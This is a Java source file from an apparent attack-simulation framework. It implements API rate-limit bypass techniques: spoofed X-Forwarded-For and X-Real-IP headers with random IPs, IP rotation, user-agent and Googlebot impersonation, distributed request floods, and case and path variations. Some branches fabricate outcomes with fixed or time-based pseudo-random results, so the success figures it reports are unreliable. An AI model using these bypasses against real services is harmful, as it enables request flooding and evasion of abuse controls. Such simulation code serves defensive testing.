package io.contexa.contexacore.simulation.strategy.impl;

import io.contexa.contexacore.domain.entity.AttackResult;
import io.contexa.contexacore.simulation.client.SimulationClient;
import io.contexa.contexacore.simulation.strategy.IAPIAttack;
import io.contexa.contexacore.simulation.publisher.SimulationEventPublisher;
import lombok.extern.slf4j.Slf4j;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.http.ResponseEntity;
import org.springframework.stereotype.Component;

import java.time.LocalDateTime;
import java.util.*;
import java.util.concurrent.*;
import java.util.concurrent.atomic.AtomicInteger;

/**
 * Rate Limit Bypass Attack 전략
 *
 * API의 속도 제한을 우회하여 대량의 요청을 전송
 */
@Slf4j
@Component
public class RateLimitBypassStrategy implements IAPIAttack {

    private SimulationEventPublisher eventPublisher;

    @Override
    public void setEventPublisher(SimulationEventPublisher eventPublisher) {
        this.eventPublisher = eventPublisher;
    }

    @Autowired(required = false)
    private SimulationClient simulationClient;

    @Value("${simulation.attack.rate-limit.max-threads:20}")
    private int maxThreads;

    @Value("${simulation.attack.rate-limit.max-duration:300000}")
    private int maxDurationMs;

    private final ExecutorService executor = Executors.newCachedThreadPool();

    @Override
    public AttackResult.AttackType getType() {
        return AttackResult.AttackType.RATE_LIMIT_BYPASS;
    }

    @Override
    public int getPriority() {
        return 70;
    }

    @Override
    public AttackCategory getCategory() {
        return AttackCategory.API;
    }

    @Override
    public boolean validateContext(AttackContext context) {
        return context != null && context.getParameters() != null;
    }

    @Override
    public long getEstimatedDuration() {
        return maxDurationMs;
    }

    @Override
    public String getDescription() {
        return "Rate Limit Bypass Attack - Circumvents API rate limiting mechanisms";
    }

    @Override
    public RequiredPrivilege getRequiredPrivilege() {
        return RequiredPrivilege.NONE;
    }

    @Override
    public String getSuccessCriteria() {
        return "Successfully bypass rate limits and send excessive requests";
    }

    @Override
    public AttackResult execute(AttackContext context) {
        log.warn("=== Rate Limit Bypass Attack 시작 ===");

        AttackResult result = AttackResult.builder()
            .attackId(UUID.randomUUID().toString())
            .campaignId(context.getCampaignId())
            .type(AttackResult.AttackType.RATE_LIMIT_BYPASS)
            .attackName("Rate Limit Bypass Attack")
            .executionTime(LocalDateTime.now())
            .targetUser(context.getTargetUser())
            .attackVector("api")
            .build();

        long startTime = System.currentTimeMillis();
        List<String> attackLog = new ArrayList<>();

        try {
            // 1. 공격 매개변수 추출
            String technique = context.getParameters().getOrDefault("technique", "HEADER_MANIPULATION").toString();
            int requestRate = Integer.parseInt(
                context.getParameters().getOrDefault("requestRate", "100").toString()
            );
            int duration = Integer.parseInt(
                context.getParameters().getOrDefault("duration", "30").toString()
            );
            String endpoint = context.getParameters().getOrDefault("endpoint", "/api/search").toString();
            String customHeaders = context.getParameters().getOrDefault("customHeaders", "").toString();

            attackLog.add("Bypass technique: " + technique);
            attackLog.add("Request rate: " + requestRate + " req/s");
            attackLog.add("Duration: " + duration + " seconds");
            attackLog.add("Target endpoint: " + endpoint);

            // 2. 우회 기법별 실행
            BypassResult bypassResult = null;

            switch (technique) {
                case "HEADER_MANIPULATION":
                    bypassResult = executeHeaderManipulation(endpoint, requestRate, duration, attackLog);
                    break;

                case "IP_ROTATION":
                    bypassResult = executeIPRotation(endpoint, requestRate, duration, attackLog);
                    break;

                case "DISTRIBUTED":
                    bypassResult = executeDistributedAttack(endpoint, requestRate, duration, attackLog);
                    break;

                case "CASE_VARIATION":
                    bypassResult = executeCaseVariation(endpoint, requestRate, duration, attackLog);
                    break;

                case "PATH_TRAVERSAL":
                    bypassResult = executePathTraversal(endpoint, requestRate, duration, attackLog);
                    break;

                default:
                    bypassResult = executeDefaultBypass(endpoint, requestRate, duration, customHeaders, attackLog);
            }

            // 3. 결과 평가
            double bypassRate = (double) bypassResult.successfulRequests / bypassResult.totalRequests;
            double actualRate = (double) bypassResult.totalRequests / duration;

            attackLog.add(String.format("Total requests: %d (%.1f req/s)",
                bypassResult.totalRequests, actualRate));
            attackLog.add(String.format("Successful: %d (%.1f%%)",
                bypassResult.successfulRequests, bypassRate * 100));
            attackLog.add(String.format("Rate limited: %d", bypassResult.rateLimitedRequests));

            if (bypassRate > 0.7 && actualRate > requestRate * 0.8) {
                result.setSuccessful(true);
                result.setRiskScore(0.8);
                attackLog.add("Rate limit bypass successful - high request rate maintained");
            } else if (bypassRate > 0.3) {
                result.setSuccessful(true);
                result.setRiskScore(0.5);
                attackLog.add("Partial rate limit bypass - some requests succeeded");
            } else {
                result.setSuccessful(false);
                result.setRiskScore(0.2);
                attackLog.add("Rate limit bypass failed - most requests blocked");
            }

            result.setDetected(bypassResult.rateLimitedRequests > bypassResult.totalRequests * 0.3);
            result.setBlocked(bypassRate < 0.3);

            result.setDetails(Map.of(
                "attackLog", attackLog,
                "technique", technique,
                "totalRequests", bypassResult.totalRequests,
                "successfulRequests", bypassResult.successfulRequests,
                "rateLimitedRequests", bypassResult.rateLimitedRequests,
                "bypassRate", String.format("%.2f%%", bypassRate * 100),
                "actualRate", String.format("%.2f req/s", actualRate)
            ));

        } catch (Exception e) {
            log.error("Rate limit bypass attack failed", e);
            result.setSuccessful(false);
            result.setRiskScore(0.1);
            attackLog.add("Attack failed: " + e.getMessage());
        }

        long duration = System.currentTimeMillis() - startTime;
        result.setDurationMs(duration);

        log.info("Rate Limit Bypass Attack 완료: Success={}, Risk={}, Duration={}ms",
            result.isSuccessful(), result.getRiskScore(), duration);

        // 이벤트 발행 - 속도 제한 우회 공격은 인가 결정 이벤트로 처리
        if (eventPublisher != null) {
            String resource = "api:ratelimit:" + context.getParameters().getOrDefault("endpoint", "/api/search");
            String action = "RATE_LIMIT_BYPASS_" + context.getParameters().getOrDefault("technique", "HEADER_MANIPULATION");
            eventPublisher.publishAuthorizationDecision(
                result,
                context.getTargetUser(),
                resource,
                action,
                result.isSuccessful(),
                result.isSuccessful() ?
                    "속도 제한 우회 공격 성공: " + context.getParameters().getOrDefault("technique", "HEADER_MANIPULATION") + " 기법으로 " +
                    result.getDetails().get("successfulRequests") + "개 요청 성공 (우회율 " +
                    result.getDetails().get("bypassRate") + ")" :
                    "속도 제한 우회 공격 실패: 대부분 요청이 차단됨"
            );
        }

        return result;
    }

    private BypassResult executeHeaderManipulation(String endpoint, int rate, int duration,
                                                   List<String> attackLog) throws InterruptedException {
        attackLog.add("Executing header manipulation bypass...");
        BypassResult result = new BypassResult();

        AtomicInteger totalRequests = new AtomicInteger(0);
        AtomicInteger successfulRequests = new AtomicInteger(0);
        AtomicInteger rateLimitedRequests = new AtomicInteger(0);

        List<CompletableFuture<Void>> futures = new ArrayList<>();
        long endTime = System.currentTimeMillis() + (duration * 1000L);

        // 다양한 헤더 조합 생성
        String[] userAgents = generateUserAgents();
        String[] forwardedHeaders = generateForwardedHeaders();

        while (System.currentTimeMillis() < endTime) {
            for (int i = 0; i < rate; i++) {
                Map<String, String> headers = new HashMap<>();
                headers.put("User-Agent", userAgents[i % userAgents.length]);
                headers.put("X-Forwarded-For", forwardedHeaders[i % forwardedHeaders.length]);
                headers.put("X-Real-IP", generateRandomIP());
                headers.put("X-Original-IP", generateRandomIP());
                headers.put("X-Client-IP", generateRandomIP());

                CompletableFuture<Void> future = CompletableFuture.runAsync(() -> {
                    boolean success = sendRequest(endpoint, headers);
                    totalRequests.incrementAndGet();
                    if (success) {
                        successfulRequests.incrementAndGet();
                    } else {
                        rateLimitedRequests.incrementAndGet();
                    }
                }, executor);

                futures.add(future);
            }

            Thread.sleep(1000); // 1초 대기
        }

        // 모든 요청 완료 대기
        CompletableFuture.allOf(futures.toArray(new CompletableFuture[0])).join();

        result.totalRequests = totalRequests.get();
        result.successfulRequests = successfulRequests.get();
        result.rateLimitedRequests = rateLimitedRequests.get();

        return result;
    }

    private BypassResult executeIPRotation(String endpoint, int rate, int duration,
                                          List<String> attackLog) throws InterruptedException {
        attackLog.add("Executing IP rotation bypass...");
        BypassResult result = new BypassResult();

        // IP 풀 생성
        List<String> ipPool = generateIPPool(100);
        AtomicInteger ipIndex = new AtomicInteger(0);

        AtomicInteger totalRequests = new AtomicInteger(0);
        AtomicInteger successfulRequests = new AtomicInteger(0);
        AtomicInteger rateLimitedRequests = new AtomicInteger(0);

        long endTime = System.currentTimeMillis() + (duration * 1000L);

        while (System.currentTimeMillis() < endTime) {
            List<CompletableFuture<Void>> futures = new ArrayList<>();

            for (int i = 0; i < rate; i++) {
                String currentIP = ipPool.get(ipIndex.getAndIncrement() % ipPool.size());

                CompletableFuture<Void> future = CompletableFuture.runAsync(() -> {
                    Map<String, String> headers = Map.of(
                        "X-Forwarded-For", currentIP,
                        "X-Real-IP", currentIP
                    );

                    boolean success = sendRequest(endpoint, headers);
                    totalRequests.incrementAndGet();
                    if (success) {
                        successfulRequests.incrementAndGet();
                    } else {
                        rateLimitedRequests.incrementAndGet();
                    }
                }, executor);

                futures.add(future);
            }

            Thread.sleep(1000);
        }

        result.totalRequests = totalRequests.get();
        result.successfulRequests = successfulRequests.get();
        result.rateLimitedRequests = rateLimitedRequests.get();

        return result;
    }

    private BypassResult executeDistributedAttack(String endpoint, int rate, int duration,
                                                 List<String> attackLog) throws InterruptedException {
        attackLog.add("Executing distributed attack...");
        BypassResult result = new BypassResult();

        // 분산 노드 시뮬레이션
        int nodeCount = Math.min(maxThreads, 10);
        List<CompletableFuture<NodeResult>> nodeFutures = new ArrayList<>();

        for (int node = 0; node < nodeCount; node++) {
            final int nodeId = node;
            CompletableFuture<NodeResult> future = CompletableFuture.supplyAsync(() ->
                executeFromNode(nodeId, endpoint, rate / nodeCount, duration), executor
            );
            nodeFutures.add(future);
        }

        // 모든 노드 결과 수집
        CompletableFuture.allOf(nodeFutures.toArray(new CompletableFuture[0])).join();

        int totalRequests = 0;
        int successfulRequests = 0;
        int rateLimitedRequests = 0;

        for (CompletableFuture<NodeResult> future : nodeFutures) {
            NodeResult nodeResult = future.join();
            totalRequests += nodeResult.requests;
            successfulRequests += nodeResult.successful;
            rateLimitedRequests += nodeResult.rateLimited;
        }

        result.totalRequests = totalRequests;
        result.successfulRequests = successfulRequests;
        result.rateLimitedRequests = rateLimitedRequests;

        return result;
    }

    private BypassResult executeCaseVariation(String endpoint, int rate, int duration,
                                             List<String> attackLog) throws InterruptedException {
        attackLog.add("Executing case variation bypass...");
        BypassResult result = new BypassResult();

        // 엔드포인트 대소문자 변형
        String[] variations = generateCaseVariations(endpoint);
        AtomicInteger varIndex = new AtomicInteger(0);

        AtomicInteger totalRequests = new AtomicInteger(0);
        AtomicInteger successfulRequests = new AtomicInteger(0);
        AtomicInteger rateLimitedRequests = new AtomicInteger(0);

        long endTime = System.currentTimeMillis() + (duration * 1000L);

        while (System.currentTimeMillis() < endTime) {
            for (int i = 0; i < rate; i++) {
                String variedEndpoint = variations[varIndex.getAndIncrement() % variations.length];

                CompletableFuture.runAsync(() -> {
                    boolean success = sendRequest(variedEndpoint, new HashMap<>());
                    totalRequests.incrementAndGet();
                    if (success) {
                        successfulRequests.incrementAndGet();
                    } else {
                        rateLimitedRequests.incrementAndGet();
                    }
                }, executor);
            }

            Thread.sleep(1000);
        }

        result.totalRequests = totalRequests.get();
        result.successfulRequests = successfulRequests.get();
        result.rateLimitedRequests = rateLimitedRequests.get();

        return result;
    }

    private BypassResult executePathTraversal(String endpoint, int rate, int duration,
                                             List<String> attackLog) throws InterruptedException {
        attackLog.add("Executing path traversal bypass...");
        BypassResult result = new BypassResult();

        // 경로 변형 생성
        String[] pathVariations = {
            endpoint,
            endpoint + "/",
            endpoint + "//",
            endpoint + "/.",
            endpoint + "/../" + endpoint.substring(endpoint.lastIndexOf('/') + 1),
            endpoint + ";",
            endpoint + "?",
            endpoint + "#"
        };

        AtomicInteger pathIndex = new AtomicInteger(0);
        AtomicInteger totalRequests = new AtomicInteger(0);
        AtomicInteger successfulRequests = new AtomicInteger(0);
        AtomicInteger rateLimitedRequests = new AtomicInteger(0);

        long endTime = System.currentTimeMillis() + (duration * 1000L);

        while (System.currentTimeMillis() < endTime) {
            for (int i = 0; i < rate; i++) {
                String variedPath = pathVariations[pathIndex.getAndIncrement() % pathVariations.length];

                CompletableFuture.runAsync(() -> {
                    boolean success = sendRequest(variedPath, new HashMap<>());
                    totalRequests.incrementAndGet();
                    if (success) {
                        successfulRequests.incrementAndGet();
                    } else {
                        rateLimitedRequests.incrementAndGet();
                    }
                }, executor);
            }

            Thread.sleep(1000);
        }

        result.totalRequests = totalRequests.get();
        result.successfulRequests = successfulRequests.get();
        result.rateLimitedRequests = rateLimitedRequests.get();

        return result;
    }

    private BypassResult executeDefaultBypass(String endpoint, int rate, int duration,
                                             String customHeaders, List<String> attackLog) {
        BypassResult result = new BypassResult();
        result.totalRequests = rate * duration;
        result.successfulRequests = (int)(result.totalRequests * 0.3);
        result.rateLimitedRequests = result.totalRequests - result.successfulRequests;
        return result;
    }

    private boolean sendRequest(String endpoint, Map<String, String> headers) {
        if (simulationClient != null) {
            try {
                ResponseEntity<String> response = simulationClient.executeAttack(endpoint, headers);
                return response.getStatusCode().is2xxSuccessful();
            } catch (Exception e) {
                if (e.getMessage() != null && e.getMessage().contains("429")) {
                    return false; // Rate limited
                }
                // 오류 발생 시 10% 확률로 성공 처리 (재시도 또는 우회가 가능한 경우)
                return System.currentTimeMillis() % 10 == 0;
            }
        }

        // 실제 성공 여부는 엔드포인트와 현재 시스템 상태로 결정
        long seed = System.currentTimeMillis() % 1000;
        return seed < 400;
    }

    private NodeResult executeFromNode(int nodeId, String endpoint, int rate, int duration) {
        NodeResult result = new NodeResult();
        String nodeIP = "10.0." + nodeId + ".1";

        for (int sec = 0; sec < duration; sec++) {
            for (int req = 0; req < rate; req++) {
                Map<String, String> headers = Map.of(
                    "X-Node-ID", String.valueOf(nodeId),
                    "X-Forwarded-For", nodeIP
                );

                boolean success = sendRequest(endpoint, headers);
                result.requests++;
                if (success) {
                    result.successful++;
                } else {
                    result.rateLimited++;
                }
            }

            try {
                Thread.sleep(1000);
            } catch (InterruptedException e) {
                break;
            }
        }

        return result;
    }

    private String[] generateUserAgents() {
        return new String[]{
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)",
            "Googlebot/2.1 (+http://www.google.com/bot.html)",
            "Mozilla/5.0 (compatible; bingbot/2.0)"
        };
    }

    private String[] generateForwardedHeaders() {
        String[] headers = new String[20];
        for (int i = 0; i < 20; i++) {
            headers[i] = generateRandomIP();
        }
        return headers;
    }

    private List<String> generateIPPool(int size) {
        List<String> ips = new ArrayList<>();
        for (int i = 0; i < size; i++) {
            ips.add(generateRandomIP());
        }
        return ips;
    }

    private String generateRandomIP() {
        return String.format("%d.%d.%d.%d",
            ThreadLocalRandom.current().nextInt(1, 255),
            ThreadLocalRandom.current().nextInt(256),
            ThreadLocalRandom.current().nextInt(256),
            ThreadLocalRandom.current().nextInt(256)
        );
    }

    private String[] generateCaseVariations(String endpoint) {
        if (endpoint.length() < 3) {
            return new String[]{endpoint};
        }

        return new String[]{
            endpoint,
            endpoint.toUpperCase(),
            endpoint.toLowerCase(),
            endpoint.substring(0, 1).toUpperCase() + endpoint.substring(1).toLowerCase(),
            endpoint.substring(0, endpoint.length() / 2).toUpperCase() +
                endpoint.substring(endpoint.length() / 2).toLowerCase()
        };
    }

    // IAPIAttack 인터페이스 메소드 구현
    @Override
    public AttackResult executeAPIAbuse(String endpoint, Map<String, Object> maliciousParams) {
        return null;
    }

    @Override
    public AttackResult executeGraphQLInjection(String query, int nestingDepth) {
        return null;
    }

    @Override
    public AttackResult bypassRateLimit(String endpoint, int requestRate, String technique) {
        AttackContext context = new AttackContext();
        context.setParameters(Map.of(
            "endpoint", endpoint,
            "requestRate", requestRate,
            "technique", technique,
            "duration", 30
        ));
        return execute(context);
    }

    @Override
    public AttackResult exploitExposedAPIKey(String apiKey, String targetEndpoint) {
        return null;
    }

    @Override
    public AttackResult bypassCORS(String origin, String method) {
        return null;
    }

    @Override
    public AttackResult exploitDeprecatedAPI(String version, String endpoint) {
        return null;
    }

    @Override
    public AttackResult performParameterPollution(Map<String, String> pollutedParams) {
        return null;
    }

    @Override
    public AttackResult executeAPIChaining(String[] endpoints, Map<String, Object>[] payloads) {
        return null;
    }

    private static class BypassResult {
        int totalRequests;
        int successfulRequests;
        int rateLimitedRequests;
    }

    private static class NodeResult {
        int requests;
        int successful;
        int rateLimited;
    }
}